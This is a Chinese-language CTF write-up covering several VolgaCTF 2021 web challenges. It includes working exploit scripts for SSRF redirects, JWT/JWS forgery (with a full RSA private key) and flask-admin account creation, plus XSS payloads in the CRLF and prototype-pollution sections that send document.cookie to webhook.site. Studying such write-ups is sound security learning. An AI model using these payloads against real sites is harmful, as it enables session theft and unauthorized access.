---
title: VolgaCTF 2021 Qualifier writeup
date: 2021-03-28 17:41:02
categories:
- CTF
tags:
- jwt
- middleware-security
- prototype-pollution
- xss
- flask
toc: true
---

<!-- # [VolgaCTF 2021 Qualifier](https://ctftime.org/event/1229) -->

周末打打比赛恢复做题手感，写出的题挺少的，参考大佬们的writeup分析完了，学到了很多，继续加油！

## 0x00 总结

- CVE-2020-28168 axios0.21.0 SSRF 302跳转利用方式

- CVE-2021-21315 systeminformation 命令注入

  - 漏洞查询网站：https://systeminformation.io/security.html
  - poc:[CVE-2021-21315-PoC](https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC)

- CVE最新资讯：https://twitter.com/CVEnew

- jwt 破解

- flask session伪造

  - [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign) flask session 伪造与爆破工具
  - [ flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager) flask session伪造工具

- flask-admin安全问题

  - /new 页面可伪造管理员
  - /edit 页面可查看hash，破解得到密码。

- JWT jku 权限绕过利用

  - 重定向利用
  - 工具使用
    - jwt_tools
    - myjet

- nginx $uri配置缺陷导致的CRLF，配合XSS

  - nginx中间件利用新姿势。unix socket利用

- jq原型链污染

  - 原型链污染poc集合：[client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)
  - 原型链污染fuzz：[pollute.js](https://github.com/securitum/research/tree/master/r2020_prototype-pollution)
  - 原型链未初始化变量寻找插件：[untrusted-types](https://github.com/filedescriptor/untrusted-types)

  




    







## 0x01 Unicorn Networks（solved）

http://192.46.237.106:3000/

`GET /api/getUrl?url=http://127.0.0.1:3000`尝试ssrf没啥结果。



![image-20210328130218506](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328130218506.png)

查看报错回显发现是axios0.21.0版本，经查找此版本存在[CVE-2020-28168 ](https://nvd.nist.gov/vuln/detail/CVE-2020-28168)ssrf漏洞。

漏洞描述：https://twitter.com/cvenew/status/1324815140701806592

> CVE-2020-28168 Axios NPM package 0.21.0 contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address.

该漏洞具体分析见：

- [记一次 Github 项目依赖的安全警告修复 & 分析](https://www.jianshu.com/p/4e868ca212ae)



具体方法是利用302跳转：

最开始我在vps上部署如下脚本：

```php
<?php
$schema = $_GET['s'];
$ip     = $_GET['i'];
$port   = $_GET['p'];
$query  = $_GET['q'];
if(empty($port)){
    header("Location: $schema://$ip/$query");
} else {
    header("Location: $schema://$ip:$port/$query");
}
```

然后访问：

` /api/getUrl?url=http://vpsip/index.php?s=http&i=127.0.0.1&query=/api/admin/ `

但是此处用带参数的始终不能正常跳转，可能是axios代理的原因。

（学弟直接用Location成了，amazing）

302.php内容

```php
<?php
header("Location: http://127.0.0.1/admin");
?>
```

`/api/getUrl?url=http://vpsip/302.php`



这里直接访问admin是因为dirsearch扫描到3000端口的admin目录

![image-20210328130144488](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328130144488.png)

但是重定向到/admin。



![image-20210328135622676](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328135622676.png)


两者都尝试后发现直接访问80端口的/admin可以读取到目录下的index.html

所以获取http://127.0.0.1/admin


![image-20210328135312565](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328135312565.png)



读取到admin.html源码

```html
<html>
<head>
<title>System information</title>
</head>
<body>
<h2>Get OS Information</h2>
<button onclick="retrieveOSInfo();false;">Retrieve</button>

<h2>Get service info</h2>
<input type="text" id="serviceName" value="nginx">
<button onclick="retrieveServiceInfo();false;">Retrieve</button>

<h2>Output</h2>
<textarea id="output"></textarea>
</body>
<script>
function retrieveOSInfo() {
fetch('/api/admin/os_info')
.then(response => {
                    if (response.status == 200) {
                        return response.json();
                    }
                    throw Error('Server is unavailable');
                },
                failResponse => {
                    printOutput('Server is unavailable');
                })
                .then(result => {
                    printApiResult(result);
                },
                errorMsg => {
                    printOutput(errorMsg);
                });
}

function retrieveServiceInfo() {
fetch('/api/admin/service_info?name=' + encodeURIComponent(serviceName.value))
.then(response => {
                    if (response.status == 200) {
                        return response.json();
                    }
                    throw Error('Server is unavailable');
                },
                failResponse => {
                    printOutput('Server is unavailable');
                })
                .then(result => {
                    printApiResult(result[0]);
                },
                errorMsg => {
                    printOutput(errorMsg);
                });
}

function printApiResult(jsonObject) {
result = '';
for (const [key, value] of Object.entries(jsonObject)) {
 result += `${key}: ${value}\\n`;
}
printOutput(result);
}

function printOutput(content) {
output.value = content;
}
</script>
</html>


```



```php
<?php
header("Location: http://127.0.0.1/api/admin/os_info");
?>
```

```json
{"status":"ok","content":{"platform":"linux","distro":"Ubuntu","release":"16.04.7 LTS","codename":"Xenial Xerus","kernel":"5.4.0-66-generic","arch":"x64","hostname":"c50a20ae1c85","fqdn":"c50a20ae1c85","codepage":"UTF-8","logofile":"ubuntu","serial":"c50a20ae1c85","build":"","servicepack":"","uefi":false}}
```

title上的System information说明此处用了npm systeminformation 库，查找漏洞后发现有多个命令注入漏洞，

systeminformation 漏洞查找：https://systeminformation.io/security.html

最后找到：[CVE-2021-21315](https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC)

可用poc：[CVE-2021-21315-PoC](https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC)

> 大概利用方法：
>
> yoursite.com/api/getServices?name[]=$(echo -e'Sekurak'> pwn.txt）

参照上述的方法，我们可以在vps上准备一个sh脚本

![image-20210328144538017](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328144538017.png)



302.php

![image-20210328144525032](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328144525032.png)



反弹shell：

![image-20210328144511049](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328144511049.png)



或者curl带外





![image-20210328141848404](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328141848404.png)



改成 cat Secret_dfkKKEKmvK149318K.txt | base64 在vps日志上收flag就可以了







## 0x02 JWT（solved）

http://172.105.68.62:8080/

root:root直接登录

![image-20210328102220788](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328102220788.png)



抓包发现jwt，到https://jwt.io/#debugger-io解码一下

![image-20210328102340226](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328102340226.png)



root改成admin就行了，缺一个私钥

扫描发现/secret/目录，访问得到私钥`SkQxOVRBZTFHSlJCQkZnamtMU0FKY3p6aFJRMlRzWElabmEwQ3ozZUROdS9YcjNPZ04vSitkYk5ITUR3dytLYm9BRVFKcGNKelk0N3dRZ2FoblBFRERJczdicDlRK05lNTlvSStvelRVclpoM3A3Nmkyd2FEQVNhSkwxVTE3KzdRZlBLVmRIcklVZ1g1T2VYcnBwQVY1dG9jbThJODhJbUtUZDRyNVZnd2tzPQ`

再到上面页面构造即可：

![image-20210328102256473](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328102256473.png)





## 0x03 JWS

http://192.46.234.216:5000/

```
{"header":{"alg":"RS256","jku":"http://localhost:5001/vuln/JWK","kid":"d6rFAC4MIXx26fVxB1a591QXDJDWQLw4OGhDg1ahq-M"},"payload":"TXkgSW50ZWdyaXR5IHByb3RlY3RlZCBtZXNzYWdl","signature":"r8WBnXoZNiBjt2D6p2wfdkypWUEMwTrw9dEHtd3N_sGT9scDynL2pHhmjy4C2JtbOMLNFkIfur0xs6qeI6QUiRobQpgo74aGVrT8Ne53G180NE7_3WP4chjUwiKf9iVmgGrw_O5jLGU71IBO7B04r3wfD8fg7EnMdYLN0r-tGGCpw_T9MMJD6pAhxLzretqJo3tWv1Mb1cq5RxfhJ_4lOIEGFkxphCJPaLb2_7s8K30ACvwzoNqI6JQQ3D8n_jnCEFhCYYvlpoQMpRj0dOl252AMWlZDQ3zhQJbqDov8ACqtH7KudUnamu1q_H6-5Elmzbm_R7Z8p6C4XuZkqbMEoQ"}
```


##### 完整脚本：

使用flask构建web服务，访问/hack即返回伪造的JWK。

```python
from flask import Flask, request, redirect, jsonify, send_from_directory
from jwcrypto import jwk, jws
from jwcrypto.common import json_encode
import os
import json
import requests, re

app = Flask(__name__)
app.config['pub_key'] = '{"e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ"'
app.config['all_key'] = '{"d":"AaOagaGz7rNRsEvDwr6NjvY0RwC2zzow7dipjxWXazIncJK6n24SBa4CZ2sr6G2R34M3C9r1D0yC3p7_NtCsKFSzWQrueUCGDyT_gihhYOgqghGKmjWXFNkITUJYQ0LEOEuPlA8WVG-1N8IYERhhoKLaj2r-COYwIdVMZQXeEiinXLfCVJCEtMMVNBMRfyUoY4_siQ6vMQGxJsHn8XOE2zsMnkreG7kPE-c0UrmsdnhmmyNFtegbS8dej4eH0Xy1txg81wTQSyGUru10QaFYVVAOhRFmdVNvSNWW3uL1guAOgLg8Y17FPnz1FiUGhflTeEsWwcKlVWl7QF0Bel-e1Q","dp":"nAk_O5Qi5HQRhgcsNZsGgFeEeErPn5CoXFx1DhANVbQwuNU-19P29wR4gSaDfexoLLaDXrw50g-ufmCLbz9r461LcPdmD6g9okstgPF38heLhjyTuA84xDu16sCX0ltpxWOWzhRkBeI0uhE1mjXtD7Uk9KUX5Y5SQK6MPZmVsoM","dq":"MznXQhv8h65iqwxzfPj3QwK6s9JvIR4IHnur2t3GYaCd-RG5fGSigkClUeG8TUlxViOr5ElbGsATWOzqAlr_CwTPCwEg9lcL5AKEHOy94k5CfAWMr1csa6Pp6bQJkveDf_c87s2Z1zYn6cJmJZiEJADocRyyUJ_mnh6wpvS7tgs","e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ","p":"0-jzleXm-XbQe_gjrKqFsQUypSjtVX2NJ1ckF5op0qE1XiLETHg0C-woMuEymyW-vqRAbgA5yx4pVhlmJTPkv8TVsc9OYsz1H1cswiI-I73uLJ1wgUk_4mapa7K10Mrsw2X9AZpmiP7ntc4OwVdJ7BjUoY587IbZrV0yVCKgeYM","q":"wWXeDP796mxedqUActwBTCQCR3uNjbmOINMZY2CR0DuxCa9AX8V3VZEQVUj1Q6R8o4ixrQywQy1R902Kc9dCQqBkwF4WfybzhkfwiVcf8Yy3bqZzEoGCEbs2KVnYX7J3EBIfgEQVXb_G5ZeOvWzgSTi11e1_kdcUXdANiGtISdc","qi":"MNo8DyDds5N6gw6gmA17Iu0scH5i2n30oS0nDxFp0tKqfd5WAjF7J3P_uESwzW8AvncAm7HtDBd-KEHipcOcm7rPEdfBKKhyo3Q25chBCvRPvVcslmML30p3p0_F26yd5ThHWoo3UmHNoPLiMNZN3oRsCe1w2jity3YVvZDhu48"}'

def generate_key():
   key = jwk.JWK.generate(kty='RSA', size=2048)
   print(key.export_public())
   print(key.export())

@app.route('/') #to get evil jws token
def index():
   jku = 'http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack' #localhost:5002 its own server, 5001 server with vuln open redirect
   payload = '{{config}}'
   key = jws.JWK(**json.loads(app.config['all_key']))
   jwstoken = jws.JWS(payload.encode('utf-8'))
   jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
   sig = jwstoken.serialize()
   return sig

@app.route('/hack') #to redirect, return evil JWK
def hack(): #need send as file
   with open('tmp.file', 'w') as file_write:
       file_write.write(jwk.JWK(**json.loads(app.config['all_key'])).export_public())
   uploads = os.path.join(os.path.abspath(os.path.dirname(__file__)))
   return send_from_directory(directory='.',filename='tmp.file')

@app.route('/get_flag')
def get_flag():
   payload = index()
   answ = requests.get('http://localhost:5000/jws_check',params={'payloads':payload}).text
   flag = answ
   flag = re.findall('VolgaCTF{.+?}', answ)[-1]
   print(flag)
   return flag
   
if __name__ == '__main__':
   app.run(port=5002, host='0.0.0.0')
```









## 0x04 flask-admin

http://172.105.84.156:5000/

[routes.py](https://q.2021.volgactf.ru/files/4d8310081ee27faaf342cfcf19b0c4d3/routes.py)

这道题给routes.py

拿到flag的条件是以admin身份登录，最开始我们想的是通过session伪造的方式，但是拿不到key，题目给的是flask-admin，想必是flask-admin的问题。

![image-20210330213957979](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210330213957979.png)

其中对于flask-admin页面的路由写的很奇怪

```python
class MyAdmin(admin.AdminIndexView):
    @expose('/')
    @admin_required
    def index(self):
        return super(MyAdmin, self).index()

    @expose('/user')
    @expose('/user/')
    @admin_required
    def user(self):
        return render_template_string('TODO, need create custom view')


admin = Admin(app,
              name='VolgaCTF',
              template_mode='bootstrap3',
              index_view=MyAdmin())
admin.add_view(ModelView(User, db.session))
```

问题应该就出在这。

> Flask-Admin是一个功能齐全、简单易用的Flask扩展，让你可以为Flask应用程序增加管理界面。

查询flask-admin文档可以发现其[默认的管理员页面](https://flask-admin.readthedocs.io/en/latest/api/mod_base/#default-view)，flask-admin涉及几个问题

- `/admin`路由不受用户身份验证的保护
- 可以通过自己编写的视图传递给Admin构造函数来修改默认的路由，例如

```python
class MyHomeView(AdminIndexView):
    @expose('/')
    def index(self):
        arg1 = 'Hello'
        return self.render('admin/myhome.html', arg1=arg1)

admin = Admin(index_view=MyHomeView())
```



本题就是将默认管理员页面换成了/admin/user/

flask-admin内置的功能页面：

- /new 用户创建页面，可以创建管理员
- /edit?id=xxx 修改页面，



访问/admin/user/edit?id=1，得到如下页面

![](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/112758387-bf6ee080-9020-11eb-81b3-92b1597b18f5.png)



flask中用户的密码使用werkzeug的generate_password_hash,check_password_hash来得到hash和验证hash



### 解1：直接搜索得到密码

直接搜索那个hash可以找到这篇文章：[Flask开发中的用户密码加密](https://www.cnblogs.com/jackadam/p/12196826.html)

可以知道密码是hello，登录即可得到flag





### 解2：伪造管理员用户

本地生成Hash即可伪造：

![image-20210330214658991](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210330214658991.png)



exp：

```python
import requests
from werkzeug.security import generate_password_hash
import re

def get_csrf(s,url):
   resp = s.get(url).text
   regex = r'<input\sid="csrf_token"\sname="csrf_token"\stype="hidden"\svalue="(.*?)">'
   return re.findall(regex, resp)[-1]

def get_flag(s):
   flag_url = host + '/'
   answ = s.get(flag_url).text
   flag = re.findall('VolgaCTF{.+?}', answ)[-1]
   return flag

def authN(s, auth_url, user, password):
   data = {'csrf_token': get_csrf(s, auth_url),
           'username': user,
           'password': password,
           'submit': "Sign In"
           }
   resp = s.post(auth_url, data=data)

def create_mulicious_user(s, email, username, password):
   url = host+'/admin/user/new/'
   s.get(url)
   files = {'email': (None, email), 'username': (None, username),
            'password_hash': (None, generate_password_hash(password)), 'role': (None, '2')}
   x = s.post(url, files=files)
   return True

host = 'http://localhost:5000'
def hack():
   with requests.Session() as s:
       #s.proxies.update({'http':'http://127.0.0.1:8080'})
       email = 'hacker@volgactf.ru'
       username = 'hacker'
       password = 'hacker'
       create_mulicious_user(s, email, username, password)
       authN(s,host+'/login', username, password)
       print(get_flag(s))



if __name__ == '__main__':
   hack()

```





## 0x05 Static Site

https://static-site.volgactf-task.ru/

[static-site.zip](https://q.2021.volgactf.ru/files/27aa6c0c9a36d9cc5e81486bf0f7cd65/static-site.zip)

中间件安全

作者出题想法来源：[Middleware, middleware everywhere - and lots of misconfigurations to fix](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/)



但是题目没有太难，考察nginx $uri错误使用导致的CRLF，配合proxy_pass造成重定向，控制返回内容利用xss读取cookie。

![](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/112757165-2ab5b400-901b-11eb-93e4-da002018580e.png)

nginx 配置文件

```nginx
server {
    listen 443 ssl;
    resolver 8.8.8.8;
    server_name static-site.volgactf-task.ru;

    ssl_certificate      /etc/letsencrypt/live/volgactf-task.ru/fullchain1.pem;
    ssl_certificate_key  /etc/letsencrypt/live/volgactf-task.ru/privkey1.pem;

    add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-src https://www.google.com/recaptcha/; font-src https://fonts.gstatic.com/; style-src 'self' https://fonts.googleapis.com/; script-src 'self' https://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/" always;
   
    location / {
      root /var/www/html;
    }

    location /static/ {
      proxy_pass https://volga-static-site.s3.amazonaws.com$uri;
    }
}
```



直接拼接$uri使得我们可以注入CRLF。

proxy_pass配合CRLF的payload：

```
https://static-site.volgactf-task.ru/static/app.js%20HTTP/1.0%0d%0aHost:%20ctftesthuli.s3.amazonaws.com%0d%0ayo:
```

发出的HTTP请求如下：

```http
GET /static/app.js HTTP/1.0
Host: ctftesthuli.s3.amazonaws.com
yo:
Host: static-site.volgactf-task.ru
```

这样就可以使得主机访问到恶意指定的服务器，在服务器上放置js脚本，构造xss即可拿到cookie



攻击流程

1. 创建自己的S3 bucket
2. 上传 /static/index.html
3. 上传 /static/app.js
4. 使得机器人访问 [https://static-site.volgactf-task.ru/static/index.html%20HTTP/1.0%0d%0aHost:%20ctftesthuli.s3.amazonaws.com%0d%0ayo](https://static-site.volgactf-task.ru/static/index.html HTTP/1.0 Host: ctftesthuli.s3.amazonaws.com yo):
5. XSS 成功



index.html

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  </head>

  <body class="text-center">
    
    hello
    <script src="/static/app.js%20HTTP/1.0%0d%0aHost:%20ctftesthuli.s3.amazonaws.com%0d%0ayo:"></script>
  </body>
</html>
```



app.js

```js
window.location = 'https://webhook.site?c='+document.cookie
```





## 0x06 Online Wallet (Part 1)

https://wallet.volgactf-task.ru/

[app.js](https://q.2021.volgactf.ru/files/2fa643120c4a5a62284a40600bab6e55/app.js)

![image-20210328160532080](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328160532080.png)

题目描述：

> 此任务是一个在线钱包，具有在您的帐户之间创建和转移资金的功能。要得到FLAG，您需要请求从帐户中提取资金，但是只有余额为负数或超过150个令牌时，才能使用该标志。注册时，将创建一个余额为100的钱包。

作者出题想法来源：[JSON互操作性漏洞探索](https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities)



trick点：

- nodejs与mysql处理json数据的不同



在帐户之间转移资金时，对请求正文进行了2种不同的JSON解析。

第一次使用nodejs中的body-parser

```js
const bodyParser = require('body-parser')

app.use(bodyParser.json({verify: rawBody}))

const rawBody = function (req, res, buf, encoding) {
  if (buf && buf.length) {
    req.rawBody = buf.toString(encoding || 'utf8')
  }
}
```



第二次在MySQL中提交事务，数据类型为[JSON](https://dev.mysql.com/doc/refman/8.0/en/json.html)

```js
transaction = await db.awaitQuery("INSERT INTO `transactions` (`transaction`) VALUES (?)", [req.rawBody])

await db.awaitQuery("UPDATE `wallets`, `transactions` SET `balance` = `balance` - `transaction`->>'$.amount' WHERE `wallets`.`id` = `transaction`->>'$.from_wallet' AND `transactions`.`id` = ?", [transaction.insertId])

await db.awaitQuery("UPDATE `wallets`, `transactions` SET `balance` = `balance` + `transaction`->>'$.amount' WHERE `wallets`.`id` = `transaction`->>'$.to_wallet' AND `transactions`.`id` = ?", [transaction.insertId])
```



由于余额检查发生在node上，但是在MySQL中执行事务。

![image-20210406222930509](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210406222930509.png)



![image-20210406222939014](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210406222939014.png)


ps：这得跑到啥时候才能出flag，有人是用条件竞争做的：https://github.com/aszx87410/ctf-writeups/issues/32，不过也不是很清楚条件竞争漏洞出现的机理。



关于Mysql JSON数据格式的补充

> JSON数组包含用逗号分隔并包含在`[`和`]` 字符中的值的列表：
>
> ```json
> ["abc", 10, null, true, false]
> ```
>
> JSON对象包含一组键值对，以逗号分隔，并包含在`{`和 `}`字符内：
>
> ```json
> {"k1": "value", "k2": 10}
> ```
>
> 如示例所示，JSON数组和对象可以包含字符串或数字的标量值，JSON空文字或JSON布尔值true或false文字。JSON对象中的键必须是字符串。还允许使用时间（日期，时间或日期时间）标量值：
>
> ```json
> ["12:18:29.000000", "2015-07-29", "2015-07-29 12:18:29.000000"]
> ```
>
> 允许在JSON数组元素和JSON对象键值内进行嵌套：
>
> ```json
> [99, {"id": "HK500", "cost": 75.99}, ["hot", "cold"]]
> {"k1": "value", "k2": [10, 20]}
> ```



writeup:[VolgaCTF 2021 Quals / Online Wallet, Static Site writeups](https://blog.blackfan.ru/2021/03/volgactf-2021-quals-online-wallet.html#Online_Wallet_part_1_82)

source_code:https://github.com/BlackFan/ctfs/tree/master/volgactf_2021_quals





## 0x07 Online Wallet (Part 2)

Steal `document.cookie`

https://wallet.volgactf-task.ru/

第二题的任务是执行XSS并从bot中窃取cookie。

该应用程序具有更改语言的能力，通过从Amazon S3网站下载不同版本的JS文件来实现的。

```html
<script src="https://volgactf-wallet.s3-us-west-1.amazonaws.com/locale_ru.js"></script>
```

![image-20210329224015553](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210329224015553.png)



可以通过/wallet?lang=来修改语言，这里是突破点，

```html
<script src="https://volgactf-wallet.s3-us-west-1.amazonaws.com/locale_&lt;&gt;&#34;.js"></script>
```

<>被html编码

由于该值包含在脚本的路径中，因此可以使用路径穿越来访问给定网站的任意文件`"?Lang = / .. / foo"`。

直接访问站点：https://volgactf-wallet.s3-us-west-1.amazonaws.com/，可以查看文件树并审计内部代码：

关注：deparam.js

```js
  deparam = function( params, coerce ) {
    var obj = Object.create(null), /* Prototype Pollution fix */
      coerce_types = { 'true': !0, 'false': !1, 'null': null };
    params.replace(/\+/g, ' ').split('&').forEach(function(v){
      var param = v.split( '=' ),
        key = decodeURIComponent( param[0] ),
        val,
        cur = obj,
        i = 0,
        keys = key.split( '][' ),
        keys_last = keys.length - 1;
      if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
        keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
        keys = keys.shift().split('[').concat( keys );
        keys_last = keys.length - 1;
      } else {
        keys_last = 0;
      }
      if ( param.length === 2 ) {
        val = decodeURIComponent( param[1] );
        if ( coerce ) {
          val = val && !isNaN(val)            ? +val
            : val === 'undefined'             ? undefined
            : coerce_types[val] !== undefined ? coerce_types[val]
            : val;
        }
        if ( keys_last ) {
          for ( ; i <= keys_last; i++ ) {
            key = keys[i] === '' ? cur.length : keys[i];
            cur = cur[key] = i < keys_last
              ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? Object.create(null) : [] )
              : val;
          }
        } else {
          if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
            obj[key].push( val );
          } else if ( obj[key] !== undefined ) {
            obj[key] = [ obj[key], val ];
          } else {
              obj[key] = val;
          }
        }
      } else if ( key ) {
        obj[key] = coerce
          ? undefined
          : '';
      }
    });
    return obj;
  };

  queryObject = deparam(location.search.slice(1))
```



poc如下：

```js
deparam = function (params, coerce) {
  var obj = Object.create(null) /* Prototype Pollution fix */,
    coerce_types = { true: !0, false: !1, null: null };
  params
    .replace(/\+/g, " ")
    .split("&")
    .forEach(function (v) {
      var param = v.split("="),
        key = decodeURIComponent(param[0]),
        val,
        cur = obj,
        i = 0,
        keys = key.split("]["),
        keys_last = keys.length - 1;
      if (/\[/.test(keys[0]) && /\]$/.test(keys[keys_last])) {
        keys[keys_last] = keys[keys_last].replace(/\]$/, "");
        keys = keys.shift().split("[").concat(keys);
        keys_last = keys.length - 1;
      } else {
        keys_last = 0;
      }
      if (param.length === 2) {
        val = decodeURIComponent(param[1]);
        if (keys_last) {
          for (; i <= keys_last; i++) {
            key = keys[i] === "" ? cur.length : keys[i];
            cur = cur[key] =
              i < keys_last
                ? cur[key] ||
                  (keys[i + 1] && isNaN(keys[i + 1]) ? Object.create(null) : [])
                : val;
          }
        } else {
          if (Object.prototype.toString.call(obj[key]) === "[object Array]") {
            obj[key].push(val);
          } else if (obj[key] !== undefined) {
            obj[key] = [obj[key], val];
          } else {
            obj[key] = val;
          }
        }
      } else if (key) {
        obj[key] = "";
      }
    });
  return obj;
};

var poc = {};
queryObject = deparam("a[0]=2&a[__proto__][__proto__][abc]=1");
console.log(poc.abc); // 1

```



经调试可以发现，deparam的功能是将参数进行分解，返回一个Object，存放所有参数。deparam函数存在递归的复制，这是非常典型的原型链污染出现的场景。

下一步就是寻找可用的gadget

原页面对Jquery进行了调用：

`$('[data-toggle="tooltip"]').tooltip()`



所以我们可以找一找[JQuery的gadget](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md)：

JQuery的poc有以下几种触发方式：

- `$(x).off`
- `$(html)` 
- `$.get `
- `$.getScript`

但是我们不知道tooltip是否会对上述几种方式进行调用，所以可以跟源码：

源码中存在这样的调用：

```js
  getTipElement() {
    this.tip = this.tip || $(this.config.template)[0]
    return this.tip
  }
```

$(this.config.template)中this.config.template就是上述的html，所以可以用下面的方法进行触发

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.div=['1','<img src onerror=alert(1)>','1']
</script>
<script>
  $('<div x="x"></div>')
</script>
```



源码中存在

`<span class="d-inline-block" tabindex="0" data-toggle="tooltip" title="Not implemented yet" id="depositButton">`

是一个使用了tooltip的元素，id是depositButton。



总体利用思路如下：

- l利用lang参数的目录遍历引用 `deparam.js`
- 按照gadget的方法污染原型链，怎么写呢，看完下面的payload就明白了，当然顺序不一定要对应上`['1','payload','1']`
- id为`#depositButton`的元素触发tooltip进而触发XSS



payload

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  </head>
  <body>
    <script>
      fetch('https://webhook.site/f77fba3b-a14a-4fad-a39e-2f439861882a?check').then(r =>r).catch(err => console.log(err))
    function run() {
      setTimeout(() => {
f.src = "https://wallet.volgactf-task.ru/wallet?lang=/../deparam&a[0]=2&a[__proto__][__proto__][div][0]=1&a[__proto__][__proto__][div][1]=%3Cimg%20src%20onerror%3Dfetch(%22https%3A%2F%2Fwebhook.site%3Fc%3D%22%2Bdocument.cookie)%3E&a[__proto__][__proto__][div][2]=1#depositButton"
      }, 2000)
      
    }
  </script>
    <iframe id="f" onload="run()" src="https://wallet.volgactf-task.ru/wallet?lang=/../deparam&a[0]=2&a[__proto__][__proto__][div][0]=1&a[__proto__][__proto__][div][1]=%3Cimg%20src%20onerror%3Dfetch(%22https%3A%2F%2Fwebhook.site%3Fc%3D%22%2Bdocument.cookie)%3E&a[__proto__][__proto__][div][2]=1"></iframe>
  </body>

</html>
```



### 寻找原型链污染的小技巧

取自：[Online Wallet (part 2)](https://blog.blackfan.ru/2021/03/volgactf-2021-quals-online-wallet.html#Online_Wallet_part_2_135)

有两种方法可以触发原型污染的利用代码

- 利用未初始化的字段访问到易受攻击的代码：可以利用[pollute.js](https://github.com/securitum/research/tree/master/r2020_prototype-pollution)
- 首先突出显示不安全的代码片段，然后查找影响它的未初始化的字段：可以使用：[Untrusted Types for DevTools](https://github.com/filedescriptor/untrusted-types) 工具



[Untrusted Types for DevTools](https://github.com/filedescriptor/untrusted-types) 

![yF8wnAF](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/yF8wnAF.png)







众多js库的原型链污染利用项目：[client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

原型链污染利用链正向搜索脚本：[pollute.js](https://github.com/securitum/research/tree/master/r2020_prototype-pollution)

原型链寻找易受攻击的未初始化字段工具：[untrusted-types](https://github.com/filedescriptor/untrusted-types)







## 参考资料

- [VolgaCTF 2021 Qualifier - flask-admin](https://github.com/aszx87410/ctf-writeups/issues/31)
- [flask-admin writeups](https://telegra.ph/flask-admin-writeups-03-28)
- [Flask开发中的用户密码加密](https://www.cnblogs.com/jackadam/p/12196826.html)
- [JWS writeups](https://telegra.ph/JWS-writeups-03-28)
- [Online Wallet (part 2)](https://blog.blackfan.ru/2021/03/volgactf-2021-quals-online-wallet.html#Online_Wallet_part_2_135)